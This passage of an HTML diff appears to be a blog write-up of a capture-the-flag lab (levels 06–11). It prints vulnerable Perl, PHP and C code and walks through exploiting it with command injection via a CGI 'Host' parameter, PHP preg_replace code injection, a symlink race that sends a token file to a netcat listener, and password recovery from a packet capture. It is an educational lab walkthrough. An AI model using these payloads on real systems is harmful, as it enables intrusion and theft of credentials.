+  <li>John answers almost immediately, giving the password that can now be used for the <code class="language-plaintext highlighter-rouge">su</code> command to become user flag06 and execute <code class="language-plaintext highlighter-rouge">getflag</code></li>
+</ol>
+
+<h3 id="level-07">[Level 07]</h3>
+<p>Perl program allowing to ping to check for reachability from a webserver.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nv">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
+
+<span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>
+
+<span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
+    <span class="nv">$host</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="k">print</span><span class="p">("</span><span class="s2">Ping results</span><span class="p">");</span>
+
+    <span class="nv">@output</span> <span class="o">=</span> <span class="p">`</span><span class="sb">ping -c 3 </span><span class="si">$host</span><span class="sb"> 2&gt;&amp;1</span><span class="p">`;</span>
+    <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="si">$line</span><span class="p">";</span> <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># check if Host set. if not, display normal page, etc</span>
+<span class="nv">ping</span><span class="p">(</span><span class="nv">param</span><span class="p">("</span><span class="s2">Host</span><span class="p">"));</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Even without knowing Perl, it is clear that there is a possibility to inject stuff where the <code class="language-plaintext highlighter-rouge">ping</code> command is created by modifying the <code class="language-plaintext highlighter-rouge">$host</code> parameter. Also, the challenge description says that the file is served through a webserver, and in the flag07 folder we find a <code class="language-plaintext highlighter-rouge">thttpd.conf</code> file indicating that the used port is 7007 (just grep for “port” on that file). The file can be executed also locally with <code class="language-plaintext highlighter-rouge">./index.cgi Host=127.0.0.1</code></li>
+  <li>We can inject commands by appending them after the IP to ping (or also by omitting the IP): <code class="language-plaintext highlighter-rouge">./index.cgi Host=; ls -asl</code>. However, injecting directly <code class="language-plaintext highlighter-rouge">getflag</code> doesn’t work because the permission is still for the current user.</li>
+  <li>What we can assume is that only if we send the command through the server it will run with the proper permissions to retrieve our flag. We could do that using wget, which just needs the address as parameter. We want to pass the Host as a GET parameter in the URL (remember URL encoding), so this is our command: <code class="language-plaintext highlighter-rouge">wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag</code>.</li>
+  <li>Note that you could do this also from the browser of your host, just remember to put the proper IP in the address.</li>
+</ol>
+
+<h3 id="level-08">[Level 08]</h3>
+<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
+
+<ol>
+  <li>In the flag08 folder we see there is a pcap file. That’s a file format used to store network captures, and it can be opened using WireShark.</li>
+  <li>The first thing we do is copy the file to a local folder in our host system, executing from the host <code class="language-plaintext highlighter-rouge">scp level08@[[the VM IP address]]:/home/flag08/capture.pcap flag08.pcap .</code></li>
+  <li>Opening the file with WireShark we can see that there are only two machines communicating, and by right-clicking on a packet we can follow the TCP stream. Within this stream we see a line saying <code class="language-plaintext highlighter-rouge">Password: backdoor...00Rm8.ate</code>.</li>
+  <li>The dots that are part of the password looks odd, so we switch to hex view. With this view we can see that the dots correspond to hex values 0x7F, which in ASCII translates to backspace. This means that the user wrote “backdoor”, deleted the last three characters, then wrote “00Rm8”, deleted the last character and wrote “ate”.</li>
+  <li>Following the typing and deleting, we can reconstruct the password that allows us to log in t as flag08 and run <code class="language-plaintext highlighter-rouge">getflag</code></li>
+</ol>
+
+<h3 id="level-09">[Level 09]</h3>
+<p>C setuid wrapper for vulnerable PHP code.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="nf">spam</span><span class="p">(</span><span class="err">$</span><span class="n">email</span><span class="p">){</span>
+    <span class="err">$</span><span class="n">email</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/\./"</span><span class="p">,</span> <span class="s">" dot "</span><span class="p">,</span> <span class="err">$</span><span class="n">email</span><span class="p">);</span>
+    <span class="err">$</span><span class="n">email</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/@/"</span><span class="p">,</span> <span class="s">" AT "</span><span class="p">,</span> <span class="err">$</span><span class="n">email</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="err">$</span><span class="n">email</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">function</span> <span class="nf">markup</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">,</span> <span class="err">$</span><span class="n">use_me</span><span class="p">){</span>
+    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>
+
+    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/(\[email (.*)\])/e"</span><span class="p">,</span> <span class="s">"spam(</span><span class="se">\"\\</span><span class="s">2</span><span class="se">\"</span><span class="s">)"</span><span class="p">,</span> <span class="err">$</span><span class="n">contents</span><span class="p">);</span>
+    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/\[/"</span><span class="p">,</span> <span class="s">"&lt;"</span><span class="p">,</span> <span class="err">$</span><span class="n">contents</span><span class="p">);</span>
+    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/\]/"</span><span class="p">,</span> <span class="s">"&gt;"</span><span class="p">,</span> <span class="err">$</span><span class="n">contents</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="err">$</span><span class="n">contents</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="err">$</span><span class="n">output</span> <span class="o">=</span> <span class="n">markup</span><span class="p">(</span><span class="err">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="err">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+<span class="n">print</span> <span class="err">$</span><span class="n">output</span><span class="p">;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>string file_get_contents(string $filename): reads entire file into a string, and returns the file in a string, starting at the specified offset up to maxlen bytes. On failure, it will return FALSE.</p>
+</blockquote>
+
+<blockquote>
+  <p>mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject): performs a search&amp;replace based on a regular expression. When the pattern is matched, it is replaced. When the first parameter ends with “/e”, the second is evaluated as a PHP expression instead than like a simple regex.</p>
+</blockquote>
+
+<ol>
+  <li>The <code class="language-plaintext highlighter-rouge">markup()</code> function reads the content of a file passed as first argument, and looks for strings of the form “[email name@domain.com]”. These strings are passed to the <code class="language-plaintext highlighter-rouge">spam()</code> method, that substitutes every “@” with “AT” and every “.” with “dot”.</li>
+  <li>We have to find a way to inject a command rather than an email, and to make it execute. The PHP syntax has to be found with a bit of trial and error, but it turns out that something like <code class="language-plaintext highlighter-rouge">email {${phpinfo()}}]</code> will execute the <code class="language-plaintext highlighter-rouge">phpinfo</code> method properly when invoked with <code class="language-plaintext highlighter-rouge">./flag09 /tmp/email use_me</code>. Remember to save that into the <code class="language-plaintext highlighter-rouge">/tmp/email</code> file.</li>
+  <li>We can’t pass directly <code class="language-plaintext highlighter-rouge">system("getflag"())</code> as email address, because all the quotes will be escaped. It is the right moment to improvise and pick the hint that is in the method declaration: we try to pass the second argument and see what happens. This time we set the file as <code class="language-plaintext highlighter-rouge">"[email $use_me]"</code>, so that it will be interpreted as variable. If we execute that, whatever we pass as second argument will be reflected to us.</li>
+  <li>So what we want to do is pass the <code class="language-plaintext highlighter-rouge">system()</code> call as the <code class="language-plaintext highlighter-rouge">phpinfo</code> attempt so that it gets executed, and the argument to that will be our <code class="language-plaintext highlighter-rouge">$use_me</code> variable that we can set to be <code class="language-plaintext highlighter-rouge">getflag</code>: the mail file is <code class="language-plaintext highlighter-rouge">email {${system($use_me)}}]</code>, and the execution is <code class="language-plaintext highlighter-rouge">./flag09 /tmp/email getflag</code></li>
+</ol>
+
+<h3 id="level-10">[Level 10]</h3>
+<p>The binary uploads any file, as long as it meets the requirements of the access() system call.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
+        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Connecting to %s:18211 .. "</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+        <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
+        <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+        <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+        <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to connect to host %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+        <span class="p">}</span>
+
+<span class="cp">#define HITHERE ".oO Oo.\n"
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to write banner to host %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="cp">#undef HITHERE
+</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Connected!</span><span class="se">\n</span><span class="s">Sending file .. "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+        <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Damn. Unable to open file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to read from file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"wrote file!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"You don't have access to %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>int access(const char *pathname, int mode): check real user’s permissions for a file, or whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced. The check uses the calling process’s real UID and GID, rather than the effective IDs. On success it returns 0, on error -1 is returned, and errno is set appropriately.</p>
+</blockquote>
+
+<blockquote>
+  <p>TOCTOU bug: time of check to time of use is an example of race conditions caused by changes in a system between the checking of a condition (such as a security credential) and the use of the results of that check.</p>
+</blockquote>
+
+<blockquote>
+  <p>Race condition: this is a class of bugs that might happen when the output of a certain function depends on the order or timing of other uncontrollable events. This kind of problem arise often in multithreaded programming.</p>
+</blockquote>
+
+<blockquote>
+  <p>Netcat: invoked also with the simple command nc, Netcat is a networking tool for reading from and writing to connections using TCP or UDP. As in Level10, we can use it as a listener waiting for incoming connections.</p>
+</blockquote>
+
+<ol>
+  <li>This program takes a file and sends it to a specified IP address. We can test this by opening a netcat listener in our host machine with <code class="language-plaintext highlighter-rouge">nc -l 18211</code> (the port is specified in the C code) and from the VM sending a file to it with <code class="language-plaintext highlighter-rouge">./flag10 /tmp/ncTest [IP of the host]</code>. In the host we will see a little header and the content of our test file.</li>
+  <li>Similarly to Level04, we have to provide a file that passes the checks. However, it is not a check made on the name but on the actual permissions of a file. What is interesting to note is that while <code class="language-plaintext highlighter-rouge">access()</code> uses the real UID, <code class="language-plaintext highlighter-rouge">open()</code> still uses the effective UID, which in our case will contain SUID. This is a case of TOCTOU bug that we can exploit.</li>
+  <li>
+    <p>To exploit the bug we have to create a race condition. To do this we create a loop that constantly swaps the real file with a fake file using symlinks: by executing the flag10 program multiple times we hope that at some point we will be lucky and run it with the perfect timing so that the <code class="language-plaintext highlighter-rouge">access()</code> tests the real file and the <code class="language-plaintext highlighter-rouge">open()</code> gets the swapped file. We create the loop in a bash file:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
+ <span class="k">while </span><span class="nb">true
+ </span><span class="k">do
+     </span><span class="nb">ln</span> <span class="nt">-sf</span> /home/flag10/token /tmp/swaptok
+     <span class="nb">ln</span> <span class="nt">-sf</span> /tmp/ncTest /tmp/swaptok
+ <span class="k">done</span>
+</code></pre></div>    </div>
+  </li>
+  <li>We run this file with ``./loop.sh &amp;<code class="language-plaintext highlighter-rouge">, where the &amp; is needed to put the job in the background so that we can run something else in the meantime. In our host we start netcat again, this time using the -k flag so that it will keep listening: </code>nc -lk 18211`.</li>
+  <li>The last step is to run flag10 multiple times passing our symlink to it, until we manage to trigger the race condition. To do this, we use an inline loop (using a script form tmp folder would not work because we don’t have read access): <code class="language-plaintext highlighter-rouge">while true; do ./flag10 /tmp/swaptok [IP of the host]; done;</code></li>
+  <li>On the host machine we see that netcat is receiving a lot of things, and among them there is a weird-looking string. This string is generated when we manage to trigger the race condition properly, and as in one of the previous challenges, we can use it as password to <code class="language-plaintext highlighter-rouge">su</code> to the flag10 account, and from there execute <code class="language-plaintext highlighter-rouge">getflag</code></li>
+</ol>
+
+<h3 id="level-11">[Level 11]</h3>
+<p>A binary processes standard input and executes a shell command.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Return a random, non predictable file, and return the file descriptor for it.</span>
+<span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"TEMP"</span><span class="p">);</span>
+    <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+    
+    <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"%s/%d.%c%c%c%c%c%c"</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
+        <span class="sc">'A'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">'0'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
+        <span class="sc">'a'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">'A'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
+        <span class="sc">'0'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">'a'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
+        <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">#define CL "Content-Length: "
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"reading from stdin"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"invalid header"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"fread length"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>
+
+        <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>
+
+        <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"blue = %d, length = %d, "</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+
+            <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"pink = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"fread fail(blue = %d, length = %d)"</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
+            <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
+        <span class="p">}</span>    
+
+        <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"mmap"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>File descriptor: an FD is a handle used to access a file or IO resources. It’s a non-negative integer (negative values indicate “no value” or an error). Each Unix process (except perhaps a daemon) should expect to have three standard POSIX file descriptors, corresponding to the three standard streams: 0 for standard input, 1 for standard output and 2 for standard error.
+File descriptors index into a per-process table maintained by the kernel, that in turn indexes into a system-wide table of files opened by all processes, called the file table. This table records the mode with which the file has been opened: for reading, writing, appending, and possibly other modes. It also indexes into a third table called the inode table that describes the actual underlying files. To perform input or output, the process passes the file descriptor to the kernel through a system call, and the kernel will access the file on behalf of the process. The process does not have direct access to the file or inode tables.
+On Linux, the set of file descriptors open in a process can be accessed under the path /proc/PID/fd/, where PID is the process identifier.</p>
+</blockquote>
+
+<blockquote>
+  <p>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream): the function reads nmemb elements of data, each size bytes long, from the stream pointed to by stream, storing them at the location given by ptr. It returns the number of items successfully read (not the number of characters).</p>
+</blockquote>
+
+<ol>
+  <li>The code reads from the standard input, checks for “Content-Length: “, reads an integer representing a length and processes it. Then if the length is less than the buf length (1024) fread is called.</li>
+  <li>To access the call to <code class="language-plaintext highlighter-rouge">process()</code> we have to pass 1 as the CL integer, so that the amount of read characters corresponds to their length. This character is the second input that we will give to the function.</li>
+  <li>After a couple of attempts with inputs like <code class="language-plaintext highlighter-rouge">Content-Length: 1\nX</code> we see that the result is always a letter (a fixed one for each input) and some hex values. As we are allowed to pass only a single char we can not give a properly null-terminated string, but after some more attempts it shows that the hex values are probably from the uninitialzed portion of the array, and therefore null bytes are not uncommon.</li>
+  <li>Given that the flag11 file has SUID permissions, if we manage to use it to run the <code class="language-plaintext highlighter-rouge">getflag</code> command it should work properly. To do this, we create a symlink to <code class="language-plaintext highlighter-rouge">/bin/getflag</code> (we know the location thanks to <code class="language-plaintext highlighter-rouge">whereis</code>) with the name of a known output. In our case, if we pass “X”, we set the symlink with <code class="language-plaintext highlighter-rouge">ln -s /bin/getflag /tmp/Y</code>.</li>
